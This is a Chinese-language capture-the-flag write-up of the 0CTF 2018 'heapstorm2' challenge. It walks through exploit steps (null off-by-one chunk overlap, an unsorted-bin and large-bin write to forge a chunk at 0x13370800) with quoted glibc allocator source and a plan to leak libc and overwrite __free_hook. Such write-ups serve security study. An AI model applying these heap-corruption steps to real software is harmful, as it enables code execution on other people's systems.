#0ctf 2018 heapstorm 2

反正打死我也想不到是这么做的。

看看wp，我觉得我还是陪鱼师傅摸鱼吧。

###  题目简述
首先通过

```c
 if ( !mallopt(1, 0) )
    exit(-1);
```
关掉了fastbin。

然后在0x13370800上mmap出一块内存，上面存着如下数组：

```c
a1[0]
a1[1]
a1[2]  都是随机数
a1[3]  

a1[4] = a1[0] ^ addr    addr = calloc(size)
a1[5] = a1[1]^size
...

a1[3] = a1[2]
```
Update的时候有一个 null off-by-one.

view的时候会检查：

```c
if ( (a1[3] ^ a1[2]) != 0x13377331LL )
    return puts("Permission denied");
```
所以整个题目问题的关键是当前情况下无法view，也就无法泄露任何地址。所以绕过view的检查就是思路的开始。

如果通过一堆骚操作能返回任意的地址该多好啊。

### unsortbin and largrbin 骚操作（house of 啥？）

null off-by-one可以chunk shrink去造成chunk overlap。

```c
 alloc(0x18)     #0
 alloc(0x508)    #1
 alloc(0x18)     #2
 update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size

 alloc(0x18)     #3
 alloc(0x508)    #4
 alloc(0x18)     #5
 update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
 alloc(0x18)     #6

 free(1)
 update(0, 'h'*(0x18-12))    #off-by-one
 alloc(0x18)     #1
 alloc(0x4d8)    #7
 free(1)
 free(2)         #backward consolidate
 alloc(0x38)     #1
 alloc(0x4e8)    #2
```
这时候2和7就重叠了。 如果2被free掉，7可以改写free chunk。就可以unsortbin attack。

但是unsortbin的bck指针要写啥？
写0x13370800附近的地址是会报错的。size是没办法通过检查的。

其他我们啥都不知道。（做题时）想破脑袋都想不出来。

看看wp接下来：

```c
free(4)
update(3, 'h'*(0x18-12))    #off-by-one
alloc(0x18)     #4
alloc(0x4d8)    #8
free(4)
free(5)         #backward consolidate
alloc(0x48)     #4

free(2)
alloc(0x4e8)    #2
free(2)

storage = 0x13370000 + 0x800
fake_chunk = storage - 0x20

p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
p1 += p64(0) + p64(fake_chunk)      #bk
update(7, p1)

p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
update(8, p2)
```
在free(2)的时候，和8交叠的freed chunk被放入到了largebin中。

这个时候改写unsortbin chunk和large bin chunk会发生啥？
没啥，就是数据被改写了。

但是一旦又alloc了一个chunk：

```c
        try:
            # if the heap address starts with "0x56", you win
            alloc(0x48)     #2   if success then return to 0x0x133707f0
        except EOFError:
            # otherwise crash and try again
            r.close()
            continue
```
Calloc会如何操作unsortbin和large bin？这个时候就要看看libc源码了：

```c
  mem = _int_malloc (av, sz);
  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||
          av == arena_for_chunk (mem2chunk (mem)));
```
调用了`_int_malloc()`函数：由于这个时候fastbin里是空，所以函数会跑到：

```c
  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
                                   > av->system_mem, 0))
            malloc_printerr ("malloc(): memory corruption");
          size = chunksize (victim);
          ....
```
就是取unsort bin里的chunk，判断是不是该合并，如果是small bin是不是该分割什么的。
不是small bin(是large bin)的情况如下：

```c
       else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
                      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;
                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert (chunk_main_arena (fwd));
                      while ((unsigned long) size < chunksize_nomask (fwd))
                        {
                          fwd = fwd->fd_nextsize;
                          assert (chunk_main_arena (fwd));
                        }
                      if ((unsigned long) size
                          == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

```
 
首先判断当前的chunk size是不是小于bck->bk的size，也就是large bin里最小的chunk，如果是，直接添加到末尾。如果不是，就正向遍历large bin，直到找到一个chunk的size小于等于当前chunk size（large bin的chunk是从大到小正向排列的）。然后将当前的chunk插入到large bin的两个链表中。

large bin chunk里的`fd_nextsize`指向的是链表中第一个比自己小的chunk，`bk_nextsize`指向第一个比自己大的chunk。

看看2个链表的插入操作：

```c
 victim->fd_nextsize = fwd;
 victim->bk_nextsize = fwd->bk_nextsize;
 fwd->bk_nextsize = victim;
 victim->bk_nextsize->fd_nextsize = victim;
```

```c
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

2次插入操作的重要结果：

```c
fwd->bk_nextsize->fd_nextsize = victim
```

fwd就是large bin里的唯一（在这题中）chunk heap地址。
它的`bk_nextsize`是我们随意控制的，wp把它写成了 `0x13370800 -0x20-0x18-5`。
那么`*(0x13370800 -0x20-0x18-5 + 0x20) = victim`。

类似的

```c
fwd->bk = victim
```
我们也可以控制 fwd->bk，wp将其写为了 :  0x13370800 -0x20+8。
` *( 0x13370800 -0x20+8 ) = victim`。

插入操作结束后，又回到外面那层循环，又去寻找下一个unsortbin chunk是不是满足要求或者需要分割 。
下一个chunk的地址就是 `0x13370800 -0x20`。

这个时候这个地址已经有值了，看看是啥值？

```c
前面说 `*(0x13370800-0x18-5 = 0x133707e3 ) = victim`，
那么 0x13370800 -0x20 =  0x133707e8  ，就应该是victim的前3个字节。
这里的前3个字节是 \x00\x00\x55或者\x00\x00\x56，
```
也就是说这个时候这个chunk的size是0x50了。

但是啊但是，calloc有一个检查:

```c
  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||
          av == arena_for_chunk (mem2chunk (mem)));
```

这3个条件必须有一个满足才行。 因为这个时候我们返回的chunk不在arena的堆空间里，所以第3个条件是不能满足的。那么只有满足第2个了，chunk的mmap标志位置位，也就是只有`heap address start with 0x56`的情况下才行。

否则assert失败，程序退出。

成功则返回addr  0x13370800-0x10，这个时候就可以猥琐欲为了。

### 扫尾工作和总结

后面就简单了，看wp就行了。
大体就是往上面写地址，泄露地址上的内容。
这样就可以泄露heap和libc。

泄露了libc之后就可以改写 `__free_hook`。

感觉这是一种比较通用的方法去返回任意地址，核心操作就是通过利用unsortbin chunk加入到 large bin中的unlink去写数据，使得unsortbin中后续的chunk的size能绕过检查。


###ref

[https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3](https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3)
 
